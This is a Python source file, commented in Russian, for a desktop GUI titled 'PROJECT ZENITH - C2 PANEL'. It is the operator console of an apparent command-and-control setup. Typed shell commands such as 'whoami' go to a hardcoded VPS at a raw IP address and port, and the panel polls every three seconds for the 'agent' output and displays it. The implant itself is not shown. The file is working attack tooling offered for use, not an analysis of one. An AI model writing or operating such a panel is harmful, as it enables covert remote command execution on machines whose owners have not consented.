import customtkinter as ctk
import requests
import threading
import time

# --- Настройки ---
VPS_URL = "http://45.76.76.74:43445"
ADMIN_PASS = "MY_ADMIN_PASSWORD"
# -----------------

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class ZenithAdmin(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("PROJECT ZENITH - C2 PANEL")
        self.geometry("800x600")

        # Сетка
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # Верхняя панель управления
        self.top_frame = ctk.CTkFrame(self)
        self.top_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

        self.cmd_entry = ctk.CTkEntry(self.top_frame, placeholder_text="Введите команду (например: whoami)", width=500)
        self.cmd_entry.pack(side="left", padx=10, pady=10)

        self.send_btn = ctk.CTkButton(self.top_frame, text="ВЫПОЛНИТЬ", command=self.send_command)
        self.send_btn.pack(side="left", padx=10, pady=10)

        # Поле вывода результата
        self.result_text = ctk.CTkTextbox(self, font=("Consolas", 14))
        self.result_text.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

        # Статус-бар
        self.status_label = ctk.CTkLabel(self, text="Статус: Готов", text_color="gray")
        self.status_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")

        # Автоматическое обновление результата
        self.update_loop()

    def send_command(self):
        cmd = self.cmd_entry.get()
        if not cmd: return
        
        try:
            headers = {"Admin-Auth": ADMIN_PASS}
            resp = requests.post(f"{VPS_URL}/admin/push", json={"cmd": cmd}, headers=headers)
            if resp.status_code == 200:
                self.status_label.configure(text=f"Статус: Команда '{cmd}' отправлена. Ждем агента...", text_color="yellow")
                self.cmd_entry.delete(0, 'end')
        except Exception as e:
            self.result_text.insert("end", f"\n[!] Ошибка связи: {e}\n")

    def update_loop(self):
        def loop():
            last_res = ""
            while True:
                try:
                    headers = {"Admin-Auth": ADMIN_PASS}
                    r = requests.get(f"{VPS_URL}/admin/pull", headers=headers)
                    if r.status_code == 200:
                        current_res = r.json().get("result")
                        if current_res != last_res and current_res != "Ожидание...":
                            self.result_text.insert("end", f"\n>>> [ОТВЕТ АГЕНТА]\n{current_res}\n" + "="*40 + "\n")
                            self.result_text.see("end")
                            self.status_label.configure(text="Статус: Результат получен", text_color="green")
                            last_res = current_res
                except: pass
                time.sleep(3)
        
        threading.Thread(target=loop, daemon=True).start()

if __name__ == "__main__":
    app = ZenithAdmin()
    app.mainloop()